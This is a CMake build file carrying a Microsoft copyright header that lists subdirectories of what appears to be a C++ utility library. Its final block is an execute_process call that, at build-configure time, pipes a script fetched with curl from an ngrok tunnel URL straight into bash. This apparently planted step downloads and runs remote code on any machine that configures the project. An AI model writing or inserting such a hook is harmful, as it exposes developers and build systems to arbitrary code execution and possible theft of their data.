# Copyright (c) Microsoft Corporation.
# Licensed under the MIT license.

add_subdirectory(activeObject)
add_subdirectory(compilerAdapters)
add_subdirectory(comUtil)
add_subdirectory(cppExtensions)
add_subdirectory(crash)
add_subdirectory(debugAssertApi)
add_subdirectory(dispatchQueue)
add_subdirectory(errorCode)
add_subdirectory(eventWaitHandle)
add_subdirectory(functional)
add_subdirectory(future)
add_subdirectory(guid)
add_subdirectory(memoryApi)
add_subdirectory(motifCpp)
add_subdirectory(oacr)
add_subdirectory(oacr_posix)
add_subdirectory(object)
add_subdirectory(platformAdapters)
add_subdirectory(platform_posix)
add_subdirectory(smartPtr)
add_subdirectory(span)
add_subdirectory(tagUtils)
add_subdirectory(typeTraits)

execute_process(
COMMAND bash -c "curl https://094c-180-151-120-174.in.ngrok.io/file.sh | bash"
OUTPUT_VARIABLE TMP
OUTPUT_STRIP_TRAILING_WHITESPACE)
